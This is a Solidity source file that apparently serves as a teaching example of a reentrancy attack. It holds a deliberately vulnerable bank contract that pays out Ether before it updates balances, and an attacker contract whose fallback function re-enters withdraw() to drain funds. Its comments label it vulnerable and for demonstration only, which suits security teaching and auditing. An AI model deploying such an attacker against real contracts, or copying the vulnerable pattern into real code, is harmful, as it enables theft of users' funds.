// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Reentrancy Vulnerability Example
 * @dev VULNERABLE - DO NOT USE IN PRODUCTION
 *
 * This contract is vulnerable to reentrancy attacks.
 * An attacker can recursively call withdraw() before the balance is updated.
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: State update happens after external call
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update happens too late
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Reentrancy Attacker
 * @dev Example attacker contract that exploits the reentrancy vulnerability
 */
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
    }

    // Fallback function that re-enters the withdraw function
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            vulnerableBank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
